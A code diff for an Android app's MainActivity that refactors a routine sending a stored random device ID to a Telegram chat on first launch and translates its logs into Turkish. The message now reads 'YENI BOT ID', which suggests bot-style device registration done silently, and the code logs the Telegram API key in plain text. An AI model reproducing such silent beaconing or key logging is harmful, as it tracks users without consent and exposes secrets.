@@ -17,6 +17,10 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        setupSillyUniqueId()
+    }
+
+    private fun setupSillyUniqueId() {
         sillyPreferences = getSharedPreferences("silly_prefs", Context.MODE_PRIVATE)
         val sillyUniqueId = sillyPreferences.getString("silly_unique_id", null)
 
@@ -25,27 +29,27 @@ class MainActivity : AppCompatActivity() {
             sillyPreferences.edit().putString("silly_unique_id", newSillyUniqueId).apply()
             sendSillyUniqueIdToTelegram(newSillyUniqueId)
         } else {
-            Log.d("MainActivity", "Unique ID already exists: $sillyUniqueId")
+            Log.d("MainActivity", "Benzersiz ID zaten var: $sillyUniqueId")
         }
     }
 
     private fun sendSillyUniqueIdToTelegram(sillyUniqueId: String) {
-        Log.d("MainActivity", "Sending message to chat ID: $sillyChatId with API key: ${BuildConfig.TELEGRAM_API_KEY}")
+        Log.d("MainActivity", "Mesajı şu sohbet ID'sine gönderiliyor: $sillyChatId ve API anahtarı: ${BuildConfig.TELEGRAM_API_KEY}")
 
         lifecycleScope.launch(Dispatchers.IO) {
             try {
-                Log.d("MainActivity", "Attempting to send message: $sillyUniqueId")
-                val response = WackyRetrofitInstance.api.sendSillyMessage(sillyChatId, "New silly device ID: $sillyUniqueId")
-                Log.d("MainActivity", "Response Code: ${response.code()}")
-                Log.d("MainActivity", "Response Message: ${response.message()}")
+                Log.d("MainActivity", "Mesaj gönderilmeye çalışılıyor: $sillyUniqueId")
+                val response = WackyRetrofitInstance.api.sendSillyMessage(sillyChatId, "YENI BOT ID: $sillyUniqueId")
+                Log.d("MainActivity", "Yanıt Kodu: ${response.code()}")
+                Log.d("MainActivity", "Yanıt Mesajı: ${response.message()}")
                 if (response.isSuccessful) {
-                    Log.d("MainActivity", "Message sent successfully")
+                    Log.d("MainActivity", "Mesaj başarıyla gönderildi")
                 } else {
                     val errorBody = response.errorBody()?.string()
-                    Log.e("MainActivity", "Failed to send message: $errorBody, Code: ${response.code()}, Message: ${response.message()}")
+                    Log.e("MainActivity", "Mesaj gönderilemedi: $errorBody, Kod: ${response.code()}, Mesaj: ${response.message()}")
                 }
             } catch (e: Exception) {
-                Log.e("MainActivity", "Exception occurred while sending message", e)
+                Log.e("MainActivity", "Mesaj gönderilirken hata oluştu", e)
             }
         }
     }
